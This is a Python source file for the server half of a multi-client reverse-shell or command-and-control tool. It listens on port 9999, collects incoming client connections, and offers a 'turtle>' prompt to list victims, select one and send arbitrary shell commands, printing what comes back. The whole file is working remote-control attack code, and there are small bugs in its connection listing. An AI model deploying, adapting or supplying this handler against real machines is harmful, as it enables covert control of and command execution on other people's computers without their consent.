import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# create a socket
def create_socket():
	try:	
		global host
		global port
		global sock

		host = ""
		port = 9999

		sock = socket.socket()
	except socket.error as msg:
		print('Socket creation error: ', msg)

# binding the socket and listening to connections
def bind_socket():
	try:
		global host
		global port
		global sock

		print("Binding the port: ", port)

		sock.bind((host, port))
		sock.listen(5)

	except socket.error as msg:
		print('Socket finding error: ', msg, ' | Retrying...')
		bind_socket()

# handling connections from multiple clients and saving to a list
# closing previous connections when server.py file is restarted
def accepting_connections():
	for c in all_connections:
		c.close()
	
	del all_connections[:]
	del all_addresses[:]

	while True:
		try:
			conn, addr = sock.accept()
			sock.setblocking(1) # prevents timeout

			all_connections.append(conn)
			all_addresses.append(addr)

			print("Connection has been established: ", addr[0])
		except:
			print("Error accepting connections")
	

# 2nd thread functions
# 1. See all the current connections
# 2. Select a connection from the list
# 3. Send commands to the connected client

# interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# turtle> select 1

def start_turtle():
	while True:
		cmd = input('turtle>')
		if cmd == 'list':
			list_connections()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_commands(conn)
		else:
			print("Command not recognized")

# Display all current connections
def list_connections():
	results = ''
	selectId = 0
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(201480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue

		results = str(i) + ' ' + str(all_addresses[i][0]) + ' ' + str(all_addresses[i][1]) + '\n'

	print('----- Clients -----' + '\n' + results)

# Selecting the target
def get_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn = all_connections[target]
		print("You are now connected to: ", str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '>', end='')
		return conn
	except:
		print("Selection not valid")
		return None

# send commands to client
def send_commands(conn):
	while True:
		try:
			cmd = input()
			if cmd == 'quit':
				break
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), 'utf-8')
				print(client_response, end='')
		except:
			print("Error sending commands")
			break

# create worker threads
def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True

		t.start()

# do next job that is in the queue (handle connections, send commands)
def work():
	while True:
		x = queue.get()
		if x == 1:
			create_socket()
			bind_socket()
			accepting_connections()

		if x == 2:
			start_turtle()

		queue.task_done()

def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)

	queue.join()
	
def main():
	create_workers()
	create_jobs()

if __name__ == "__main__":
	main()